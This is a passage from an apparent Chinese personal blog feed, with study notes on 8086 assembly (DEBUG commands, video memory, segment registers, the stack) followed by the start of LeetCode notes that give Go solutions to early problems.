alt="image-20210818090443993"></p><p>内容分为三部分：</p><ul><li>CS:IP</li><li>内存单元内容</li><li>内存单元内存对应的 ASCII 码（无对应 ASCII 字符的数值和零值一样显示为<code>.</code>）</li></ul><p>连续执行则会从上次的末尾地址继续：</p><p><img src="/assembly-language/image-20210818091043246.png" class="lazyload" data-srcset="/assembly-language/image-20210818091043246.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818091043246"></p><p>也可以自行指定查看的内存单元以及限定范围：</p><p><code>D [段地址]:[偏移] [结尾偏移地址]</code></p><p><img src="/assembly-language/image-20210818091249917.png" class="lazyload" data-srcset="/assembly-language/image-20210818091249917.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818091249917"></p><p>限定范围的使用如 <code>D 1000:0 9</code> 则显示 <code>1000:0</code> ~ <code>1000：9</code> 的内容。</p><h4 id="E"><a href="#E" class="headerlink" title="E"></a>E</h4><p>E 命令可以用于改写内存中的内容，如将 <code>1000:0</code> 开始的 16 个单元（16 字节）修改为 <code>0</code> ~ <code>F</code>：</p><p><code>E [CS:IP] [DATA]...</code></p><p><img src="/assembly-language/image-20210818092347869.png" class="lazyload" data-srcset="/assembly-language/image-20210818092347869.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818092347869"></p><p>直接输入 <code>E [CS:IP]</code> 会进入交互式修改，输入一个值再输入空格则进入对下一个值的修改：</p><p><img src="/assembly-language/image-20210818093038109.png" class="lazyload" data-srcset="/assembly-language/image-20210818093038109.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818093038109"></p><p>E 命令也可以用于直接输入字符和字符串：</p><p><img src="/assembly-language/image-20210818093529581.png" class="lazyload" data-srcset="/assembly-language/image-20210818093529581.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818093529581"></p><p>能让 CPU 执行的机器码本质上就是二进制数据，因此如要写入汇编程序，直接往内存单元写对应的机器码即可。</p><h4 id="U"><a href="#U" class="headerlink" title="U"></a>U</h4><p>U 命令用于查看一段内存单元对应的汇编指令：</p><p><img src="/assembly-language/image-20210818093839094.png" class="lazyload" data-srcset="/assembly-language/image-20210818093839094.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818093839094"></p><p>同样的可以指定地址来查看：</p><p><img src="/assembly-language/image-20210818093911243.png" class="lazyload" data-srcset="/assembly-language/image-20210818093911243.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818093911243"></p><p>这其中很多数据本身并非汇编指令，但仍会被翻译（指令和数据在存储上并无区别，都是二进制，它们只在解释上有区别）。</p><p>我们可以先往里写如下的程序：</p><pre><code class="assembly">mov ax,0001 ; b80100mov cx,0002 ; b90200add ax,cx   ; 01c8</code></pre><p><img src="/assembly-language/image-20210818094450316.png" class="lazyload" data-srcset="/assembly-language/image-20210818094450316.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818094450316"></p><h4 id="T"><a href="#T" class="headerlink" title="T"></a>T</h4><p>T 命令用于执行 <code>CS:IP</code> 指向的一条或多条指令：</p><p><img src="/assembly-language/image-20210818095144182.png" class="lazyload" data-srcset="/assembly-language/image-20210818095144182.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818095144182"></p><p>以上命令执行的步骤为：</p><ol><li>修改 <code>CS:IP</code> 为 <code>1000:0</code>。</li><li>T 命令执行。</li><li>查看结果。</li></ol><p>可以看到，执行第一次 T 命令后，AX 寄存器的内容被成功修改为 <code>0001</code>，IP 的值 +3 则指向了下一条指令，这是因为指令 <code>mov ax,0001</code> 占用了 3 个字节。</p><p>我们把之前写入的三条指令都执行完：</p><p><img src="/assembly-language/image-20210818095548189.png" class="lazyload" data-srcset="/assembly-language/image-20210818095548189.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818095548189"></p><p>最后得到 <code>AX=0003</code>，符合预期的结果。</p><h4 id="A"><a href="#A" class="headerlink" title="A"></a>A</h4><p>A 命令用于直接向内存中写入汇编指令，而不是直接写入机器码：</p><p><img src="/assembly-language/image-20210818100006498.png" class="lazyload" data-srcset="/assembly-language/image-20210818100006498.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818100006498"></p><p>这里我们写入了五条汇编指令，用 U 命令查看可以发现成功存入了内存中。用 T 命令将他们全部执行：</p><p><img src="/assembly-language/image-20210818100153858.png" class="lazyload" data-srcset="/assembly-language/image-20210818100153858.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818100153858"></p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="修改显存内容"><a href="#修改显存内容" class="headerlink" title="修改显存内容"></a>修改显存内容</h4><p>按照内存地址空间的概念，有一部分地址空间被分配给了显存，在 8086 CPU 环境下它的准确范围是 <code>000A0000</code> ~ <code>000BFFFF</code>。我们通过下面的操作来修改 <code>B8100H</code> 开始的一段内存单元：</p><p><img src="/assembly-language/image-20210818105254472.png" class="lazyload" data-srcset="/assembly-language/image-20210818105254472.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818105254472"></p><p>从上面的显示来看，显存中的数据已经被改变了，请注意右上角的几个字符。</p><p>我们再改变一下输入的数据：</p><p><img src="/assembly-language/image-20210818110326953.png" class="lazyload" data-srcset="/assembly-language/image-20210818110326953.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210818110326953"></p><p>我们输入的数据总共有 8 bytes，观察显示出的符号可以发现总共有四个，实际上输入的数据每两个一组，分别对应着一个符号的内容和颜色。</p><p>这都取决于 DOS 中的设置，比如在 DOS 中色值-颜色对应如下：</p><table><thead><tr><th align="center">色值</th><th align="center">颜色</th><th align="center">色值</th><th align="center">颜色</th><th align="center">色值</th><th align="center">颜色</th><th align="center">色值</th><th align="center">颜色</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">黑色</td><td align="center">4</td><td align="center">红色</td><td align="center">8</td><td align="center">灰色</td><td align="center">C</td><td align="center">淡红色</td></tr><tr><td align="center">1</td><td align="center">蓝色</td><td align="center">5</td><td align="center">紫色</td><td align="center">9</td><td align="center">淡蓝色</td><td align="center">D</td><td align="center">淡紫色</td></tr><tr><td align="center">2</td><td align="center">绿色</td><td align="center">6</td><td align="center">黄色</td><td align="center">A</td><td align="center">淡绿色</td><td align="center">E</td><td align="center">淡黄色</td></tr><tr><td align="center">3</td><td align="center">浅绿色</td><td align="center">7</td><td align="center">白色</td><td align="center">B</td><td align="center">淡浅绿色</td><td align="center">F</td><td align="center">亮白色</td></tr></tbody></table><p>颜色由两个十六进制值表示，前者为前景色，后者为背景色，因此 07 就代表黑底白字。</p><p>那么前面的 1、2、3、4 就代表了四个符号，这来自<a href="https://en.wikipedia.org/wiki/Code_page_437">Code Page 437 字符集</a>。</p><h2 id="寄存器（内存访问）"><a href="#寄存器（内存访问）" class="headerlink" title="寄存器（内存访问）"></a>寄存器（内存访问）</h2><h3 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h3><p>CPU 中一个字（16 bits）存在一个寄存器中，但内存的最小单元为字节，一个字需要存在两个内存单元中，低位字节放在低地址单元，高位字节放在高地址单元。由此引入<strong>字单元</strong>的概念，即存放一个字型数据（16 bits）的内存单元。字单元占用 $n$、$n+1$ 内存单元则被称为 $n$ 地址字单元，如一个字占用 4、5 两个内存单元，则被称为 4 地址字单元。</p><h3 id="DS-和-addresss"><a href="#DS-和-addresss" class="headerlink" title="DS 和 [addresss]"></a>DS 和 [addresss]</h3><p>8086 CPU 中，有一个 DS 寄存器，用于存放待访问<strong>数据</strong>的段地址。如读取 <code>10000H</code> 内存单元的内容，可以使用如下程序：</p><pre><code class="assembly">mov bx, 1000Hmov ds, bxmov al, [0]</code></pre><p>其中，往 DS 写入了 <code>1000H</code>，因此 DS 的内容为 <code>1000H</code>，这是段地址。最后一句操作的 <code>[...]</code> 用于指定偏移地址，使用这种语法，CPU 会自动读 DS 内容（段地址），附加偏移地址（”[]”内数字）按照前文中的计算方式生成物理地址，最后读取物理地址指向的内存数据写入目标寄存器，即该语法最终可以直接读内存数据。</p><p>8086 CPU 不支持直接送数据到段寄存器，因此无法使用 <code>mov ds, 1000H</code> 这种写法，这属于 8086 CPU 的硬件设计问题。</p><p>DS 与 CS 的区别在于 CS 用于存储待执行<strong>指令</strong>的内存段地址，而 DS 存放的是待取<strong>数据</strong>的段地址，数据是不应被当作指令执行的。</p><h3 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h3><p>上一节中的指令 <code>mov al, [0]</code> 只是将一个字节的数据写入 AL 寄存器，这是因为 AL 寄存器大小为 8 bits。而 8086 CPU 有 16 根数据线，一次性可以传送 16 bits 的数据，即一个字。使用同样的语法即可做到传送 16 bits 数据，如 <code>mov ax, [0]</code>，因为 AX 是 16-bit 寄存器，可以直接读 16 bits 的数据存入。</p><p>示例：</p><p>内存内容：</p><table><thead><tr><th>Address</th><th>Data</th></tr></thead><tbody><tr><td>0x10000</td><td>23H</td></tr><tr><td>0x10001</td><td>11H</td></tr><tr><td>0x10002</td><td>22H</td></tr><tr><td>0x10003</td><td>66H</td></tr></tbody></table><p>程序：</p><pre><code class="assembly">mov ax, 1000Hmov ds, ax; ds = 1000Hmov ax, [0]; ax = 1123Hmov bx, [2]; bx = 6622Hmov cx, [1]; cx = 2211Hadd bx, [1]; bx = 8833Hsub bx, cx; cx = 6622H</code></pre><p>这里的 <code>sub</code> 指令是减法指令，前值减去后值，结果存在左侧表示的寄存器中。</p><h3 id="mov、add、sub"><a href="#mov、add、sub" class="headerlink" title="mov、add、sub"></a>mov、add、sub</h3><p>目前已知 <code>mov</code> 指令有以下几种操作：</p><ol><li><p>mov 寄存器，数据</p></li><li><p>mov 寄存器，寄存器</p></li><li><p>mov 寄存器，内存单元</p></li><li><p>mov 内存单元，寄存器</p></li><li><p>mov 段寄存器，寄存器</p></li></ol><p>从第五条可以知道，CPU 中存在段寄存器与通用寄存器之间的通路，因此可以推测也存在反向通路，即段寄存器 -&gt; 寄存器。</p><p>经过验证，得到 <code>mov ax, ds</code> 合法。</p><p>从第四条可以知道，CPU 中存在寄存器到内存单元的通路，而刚刚得出段寄存器可以传送数据到寄存器的结论，由此判断段寄存器可以传送数据到内存单元，如 <code>mov [0], cs</code>。</p><p>经过验证，指令合法。</p><p>根据第三、第五条可以推测存在内存单元 -&gt; 段寄存器的操作，如 <code>mov ds, [0]</code>。</p><p>经过验证，指令合法。</p><p>经过实验，<code>add</code> 和 <code>sub</code> 指令无法操作段寄存器，类似 <code>add ds, ax</code> 的指令不合法。</p><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p>同之前提到过的代码段一样，将需要操作的数据放在同一段内存单元中可以方便程序的执行和内存的管理，这就是数据段。要访问数据段中的数据，可以先用 DS 段寄存器存放数据段的地址，根据需要寻址具体单元。</p><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>栈是一种 LIFO（Last in first out）的数据结构，但在这里不去讨论它的数据结构层面内容，具体可以参考其他资料。这里只提一点：在程序化的角度，应当有指示栈顶位置的标记。</p><p>现在的 CPU 中都有栈的设计，如 8086 CPU 就提供了以栈形式操作内存空间的指令。也就是说通过这些指令，可以将部分内存空间当作栈结构使用。</p><h4 id="PUSH-amp-POP"><a href="#PUSH-amp-POP" class="headerlink" title="PUSH &amp; POP"></a>PUSH &amp; POP</h4><p>PUSH 即入栈，对应指令如 <code>push ax</code>，表示将 AX 中的内容送入栈中。</p><p>POP 即出栈，对应指令如 <code>pop ax</code>，表示将栈中的数据送入 AX 寄存器。</p><p>PUSH 和 POP 操作的数据传送单位都是字。</p><p>可以发现，上述两条指令并没有指定栈的位置在哪，那么如何确定栈空间？根据前面学习的套路，栈很显然也是由某些寄存器指定的，在 8086 CPU 中则是段寄存器 SS 和寄存器 SP。和 <code>CS:IP</code> 的表示形式相同，<strong>栈顶地址</strong>由 <code>SS:SP</code> 指定，SS 和 SP 分别指定段地址和偏移，注意这里是栈顶地址。</p><p>执行 <code>mov ax, 0123H</code> 后再执行 <code>push ax</code> 即把数据 <code>0123H</code> 送入栈，栈顶指针（<code>SS:SP</code>）往低地址方向移动，而数据也按照低地址存放低位字节，高地址存放高位字节的规则将一个字存入两个内存单元。下图中，<code>SS:SP</code> 的值为 <code>1000EH</code>，即指向 <code>23H</code>。其中，SS 的值为 <code>1000H</code>， SP 的值为 <code>000EH</code>。</p><p><img src="/assembly-language/image-20210824225724838.png" class="lazyload" data-srcset="/assembly-language/image-20210824225724838.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210824225724838"></p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;汇编语言的学习笔记，主要是对《汇编语言》（王爽）的总结、概括、补充以及实践。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="ASM" scheme="https://blog.secriy.com/tags/ASM/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode 刷题笔记</title>
    <link href="https://blog.secriy.com/leetcode-practice/"/>
    <id>https://blog.secriy.com/leetcode-practice/</id>
    <published>2021-07-15T06:29:11.000Z</published>
    <updated>2025-02-16T07:13:36.770Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>LeetCode 刷题记录。</p></div><span id="more"></span><h2 id="Tags"><a href="#Tags" class="headerlink" title="Tags"></a>Tags</h2><ul><li>双指针</li><li>单调栈</li><li>辅助栈</li><li>二分查找</li><li>并查集</li><li>动态规划</li><li>贪心算法</li><li>位运算</li><li>哈希表</li><li>KMP</li><li>DFS</li><li>BFS</li><li>回溯</li><li>排序</li><li>数学</li></ul><h2 id="1-100"><a href="#1-100" class="headerlink" title="1~100"></a>1~100</h2><h3 id="1-Two-Sum"><a href="#1-Two-Sum" class="headerlink" title="1. Two Sum"></a><a href="https://leetcode-cn.com/problems/two-sum/">1. Two Sum</a></h3><p>最容易想到的方式是使用 Map 存储遍历到的数字，并判断目标数字减去当前数字的结果是否在 Map 中，如过是直接返回。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func twoSum(nums []int, target int) []int &#123;    m := make(map[int]int)    // key: number, value: index    for k, v := range nums &#123;        if idx, ok := m[target-v]; ok &#123;            return []int&#123;k, idx&#125;        &#125;        m[v] = k    &#125;    return nil&#125;</code></pre><h3 id="2-Add-Two-Numbers"><a href="#2-Add-Two-Numbers" class="headerlink" title="2. Add Two Numbers"></a>2. <a href="https://leetcode-cn.com/problems/add-two-numbers/">Add Two Numbers</a></h3><h4 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h4><p>用 l1 存加法结果，l1 长度小于 l2 时将 l2 后半部分链表接到 l1 末尾。</p><pre><code class="go">func addTwoNumbers(l1 *ListNode, l2 *ListNode) *ListNode &#123;    carry := 0 // 进位    dummy := l1 // 结果    var pre *ListNode // 指向最后一个结点    for l1 != nil &#123;        pre = l1        if l1.Next == nil &amp;&amp; l2 != nil &#123;            // l2 长度大于 l1，将 l2 链接到 l1 上            l1.Next = l2.Next            l2.Next = nil        &#125;        if l2 != nil &#123;            l1.Val += (l2.Val + carry)        &#125; else &#123;            l1.Val += carry        &#125;        carry = l1.Val/10        l1.Val %= 10        if l1 != nil &#123;            l1 = l1.Next        &#125;        if l2 != nil &#123;            l2 = l2.Next        &#125;    &#125;    if carry &gt; 0 &#123;        pre.Next = &amp;ListNode&#123;Val: carry&#125;    &#125;    return dummy&#125;</code></pre><h3 id="3-Longest-Substring-Without-Repeating-Characters"><a href="#3-Longest-Substring-Without-Repeating-Characters" class="headerlink" title="3. Longest Substring Without Repeating Characters"></a><a href="https://leetcode.com/problems/longest-substring-without-repeating-characters/description/">3. Longest Substring Without Repeating Characters</a></h3><h4 id="滑动窗口（双指针）"><a href="#滑动窗口（双指针）" class="headerlink" title="滑动窗口（双指针）"></a>滑动窗口（双指针）</h4><pre><code class="go">func lengthOfLongestSubstring(s string) int &#123;    res, left, right := 0, 0, 0    m := make(map[byte]bool, 0)    for right &lt; len(s) &#123;        if _, ok := m[s[right]]; !ok &#123;            m[s[right]] = true            if right-left+1 &gt; res &#123;                res = right - left + 1            &#125;            right++        &#125; else &#123;            delete(m, s[left])            left++        &#125;    &#125;    return res&#125;</code></pre><pre><code class="go">func lengthOfLongestSubstring(s string) int &#123;    m := make(map[byte]int)    left, right := 0, 0    max := 0    for left &lt; len(s) &amp;&amp; right &lt; len(s) &#123;        // duplicate        if v, ok := m[s[right]]; ok &amp;&amp; v &gt;= left&#123;            left = v+1        &#125; else &#123;            if right-left+1 &gt; max &#123;                max = right-left+1            &#125;        &#125;        m[s[right]] = right        right++    &#125;    return max&#125;</code></pre><h3 id="7-Reverse-Integer"><a href="#7-Reverse-Integer" class="headerlink" title="7. Reverse Integer"></a><a href="https://leetcode.com/problems/reverse-integer/description/">7. Reverse Integer</a></h3><p>先提出符号，对数字进行循环对 10 取余来得到高一位数字，对地位数字循环乘 10 来进位。</p><pre><code class="go">func reverse(x int) int &#123;    result := 0    for x != 0 &#123;        result = result*10 + x%10        x /= 10    &#125;    if bit := result &gt;&gt; 31; bit != 0 &amp;&amp; bit != -1 &#123;        // 判断是否超出范围        return 0    &#125;    return result&#125;</code></pre><h3 id="8-String-to-Integer-atoi"><a href="#8-String-to-Integer-atoi" class="headerlink" title="8. String to Integer (atoi)"></a><a href="https://leetcode-cn.com/problems/string-to-integer-atoi/">8. String to Integer (atoi)</a></h3><pre><code class="go">func myAtoi(s string) (ret int) &#123;    i := 0    // 记录位置    flag := 1 // 标识正负    for i &lt; len(s) &amp;&amp; s[i] == &#39; &#39; &#123;        // 去除前导空格        i++    &#125;    if i &lt; len(s) &amp;&amp; s[i] == &#39;-&#39; &#123;        flag = -1    &#125;    if i &lt; len(s) &amp;&amp; (s[i] == &#39;+&#39; || s[i] == &#39;-&#39;) &#123;        i++    &#125;    for i &lt; len(s) &#123;        sub := s[i] - &#39;0&#39;        if sub &lt; 0 || sub &gt;= 10 &#123;            // 检查是不是数字            break        &#125;        if ret &gt; math.MaxInt32/10 || (ret == math.MaxInt32/10 &amp;&amp; sub &gt; 7) &#123;            // 越界            if flag &gt; 0 &#123;                return math.MaxInt32            &#125; else &#123;                return math.MinInt32            &#125;        &#125;        ret = ret*10 + int(sub)        i++    &#125;    return ret * flag&#125;</code></pre><h3 id="9-Palindrome-Number"><a href="#9-Palindrome-Number" class="headerlink" title="9. Palindrome Number"></a><a href="https://leetcode.com/problems/palindrome-number/description/">9. Palindrome Number</a></h3><h4 id="翻转数字"><a href="#翻转数字" class="headerlink" title="翻转数字"></a>翻转数字</h4><p>按照第七题写法判断翻转过后是否相等。</p><pre><code class="go">func isPalindrome(x int) bool &#123;    if x &lt; 0 &#123;        return false    &#125;    return x == reverse(x)&#125;// 翻转数字func reverse(x int) int &#123;    res := 0    for x != 0 &#123;        res = res*10 + x%10        x /= 10    &#125;    return res&#125;</code></pre><p>简化：</p><pre><code class="go">func isPalindrome(x int) bool &#123;    if x &lt; 0 &#123;        return false    &#125;    tmp := x    y := 0    for x != 0 &#123;        y = y*10 + x%10        x /= 10    &#125;    return tmp == y&#125;</code></pre><p>可以将<code>x</code>的低位反转存入另一个变量中，并将<code>x</code>除以 10，最后判断二者是否相等。</p><pre><code class="go">func isPalindrome(x int) bool &#123;    if x &lt; 0 || (x%10 == 0 &amp;&amp; x != 0) &#123;        return false // x为负数或10的倍数返回false    &#125;    num := 0    for x &gt; num &#123;        num = num*10 + x%10        x /= 10    &#125;    return x == num || x == num/10&#125;</code></pre><h4 id="转换为字符串"><a href="#转换为字符串" class="headerlink" title="转换为字符串"></a>转换为字符串</h4><p>把数字转换为字符串，用双指针各自从左右遍历字符串判断二者对应字符是否相同，直到两个指针重叠。</p><pre><code class="go">func isPalindrome(x int) bool &#123;    str := strconv.FormatInt(int64(x), 10)    length := len(str)    for i := 0; 2*i &lt; length-1; i++ &#123;        if str[i] != str[length-1-i] &#123;            return false        &#125;    &#125;    return true&#125;</code></pre><h3 id="11-Container-With-Most-Water"><a href="#11-Container-With-Most-Water" class="headerlink" title="11. Container With Most Water"></a><a href="https://leetcode-cn.com/problems/container-with-most-water/">11. Container With Most Water</a></h3><pre><code class="go">func maxArea(height []int) int &#123;    left, right := 0, len(height)-1    max := 0    for left &lt; right &#123;        capacity, min := 0, 0        if height[left] &lt; height[right] &#123;            min = height[left]            capacity = min * (right - left)            left++        &#125; else &#123;            min = height[right]            capacity = min * (right - left)            right--        &#125;        if capacity &gt; max &#123;            max = capacity        &#125;    &#125;    return max&#125;</code></pre><h3 id="13-Roman-to-Integer"><a href="#13-Roman-to-Integer" class="headerlink" title="13. Roman to Integer"></a>13. <a href="https://leetcode.com/problems/roman-to-integer/description/">Roman to Integer</a></h3><h4 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>最简单粗暴的解法就是使用<code>switch</code>语句判断每一种情况，当遇到能作为前缀的数字时判断后面的数字是否是组合数的情况，如果是则减去多余的值。</li><li>仍然是<code>switch</code>判断每一种情况，但首先把其中带有前缀的字符替换为其他字符。</li></ul><h4 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>Switch</p><pre><code class="go">func romanToInt(s string) int &#123;    result := 0    for i := 0; i &lt; len(s); i++ &#123;        switch s[i] &#123;        case &#39;I&#39;:            result += 1            if i+1 != len(s) &amp;&amp; (s[i+1] == &#39;V&#39; || s[i+1] == &#39;X&#39;) &#123;                result += -2            &#125;        case &#39;V&#39;:            result += 5        case &#39;X&#39;:            result += 10            if i+1 != len(s) &amp;&amp; (s[i+1] == &#39;L&#39; || s[i+1] == &#39;C&#39;) &#123;                result += -20            &#125;        case &#39;L&#39;:            result += 50        case &#39;C&#39;:            result += 100            if i+1 != len(s) &amp;&amp; (s[i+1] == &#39;D&#39; || s[i+1] == &#39;M&#39;) &#123;                result += -200            &#125;        case &#39;D&#39;:            result += 500        case &#39;M&#39;:            result += 1000        &#125;    &#125;    return result&#125;</code></pre><p>判断前一字符的解法为：</p><pre><code class="go">func romanToInt(s string) int &#123;    result := 0    for i := 0; i &lt; len(s); i++ &#123;        switch s[i] &#123;        case &#39;I&#39;:            result += 1        case &#39;V&#39;:            result += 5            if i &gt; 0 &amp;&amp; s[i-1] == &#39;I&#39; &#123;                result -= 2            &#125;        case &#39;X&#39;:            result += 10            if i &gt; 0 &amp;&amp; s[i-1] == &#39;I&#39; &#123;                result -= 2            &#125;        case &#39;L&#39;:            result += 50            if i &gt; 0 &amp;&amp; s[i-1] == &#39;X&#39; &#123;                result -= 20            &#125;        case &#39;C&#39;:            result += 100            if i &gt; 0 &amp;&amp; s[i-1] == &#39;X&#39; &#123;                result -= 20            &#125;        case &#39;D&#39;:            result += 500            if i &gt; 0 &amp;&amp; s[i-1] == &#39;C&#39; &#123;                result -= 200            &#125;        case &#39;M&#39;:            result += 1000            if i &gt; 0 &amp;&amp; s[i-1] == &#39;C&#39; &#123;                result -= 200            &#125;        &#125;    &#125;    return result&#125;</code></pre></li><li><p>Replace</p><pre><code class="go">func romanToInt(s string) int &#123;    s = strings.Replace(s, &quot;IV&quot;, &quot;1&quot;, -1)    s = strings.Replace(s, &quot;IX&quot;, &quot;2&quot;, -1)    s = strings.Replace(s, &quot;XL&quot;, &quot;3&quot;, -1)    s = strings.Replace(s, &quot;XC&quot;, &quot;4&quot;, -1)    s = strings.Replace(s, &quot;CD&quot;, &quot;5&quot;, -1)    s = strings.Replace(s, &quot;CM&quot;, &quot;6&quot;, -1)    result := 0    fmt.Println(s)    for _, v := range s &#123;        result += getVal(v)    &#125;    return result&#125;func getVal(r rune) int &#123;    switch r &#123;    case &#39;1&#39;:        return 4    case &#39;2&#39;:        return 9    case &#39;3&#39;:        return 40    case &#39;4&#39;:        return 90    case &#39;5&#39;:        return 400    case &#39;6&#39;:        return 900    case &#39;I&#39;:        return 1    case &#39;V&#39;:        return 5    case &#39;X&#39;:        return 10    case &#39;L&#39;:        return 50    case &#39;C&#39;:        return 100    case &#39;D&#39;:        return 500    case &#39;M&#39;:        return 1000    default:        return 0    &#125;&#125;</code></pre></li></ul><h3 id="17-Letter-Combinations-of-a-Phone-Number"><a href="#17-Letter-Combinations-of-a-Phone-Number" class="headerlink" title="17. Letter 